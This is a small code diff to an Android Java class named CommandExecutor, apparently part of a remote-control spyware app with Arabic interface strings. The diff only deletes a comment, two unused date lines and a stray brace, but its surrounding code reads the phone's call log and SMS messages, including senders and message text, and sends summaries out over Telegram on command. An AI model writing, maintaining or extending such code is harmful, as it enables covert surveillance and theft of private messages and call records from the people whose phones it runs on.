@@ -58,7 +58,6 @@ public class CommandExecutor {
     
     public void takeScreenshot() {
         sendTelegram("📸 جاري تصوير الشاشة...");
-        // التنفيذ الفعلي يحتاج MediaProjection
         sendTelegram("⚠️ هذه الميزة تحتاج تفعيل في الإصدار الكامل");
     }
     
@@ -123,7 +122,6 @@ public class CommandExecutor {
                 String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                 String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                 String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
-                String date = new Date(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE))).toString();
                 
                 sb.append("• ").append(name != null ? name : number)
                   .append(" (").append(typeText).append(")\n");
@@ -145,7 +143,6 @@ public class CommandExecutor {
             while (cursor.moveToNext()) {
                 String address = cursor.getString(cursor.getColumnIndex("address"));
                 String body = cursor.getString(cursor.getColumnIndex("body"));
-                String date = new Date(cursor.getLong(cursor.getColumnIndex("date"))).toString();
                 
                 sb.append("• من ").append(address).append(":\n")
                   .append(body.length() > 30 ? body.substring(0, 30) + "..." : body)
@@ -248,4 +245,4 @@ public class CommandExecutor {
             });
         } catch (Exception e) {}
     }
-                 }
+}
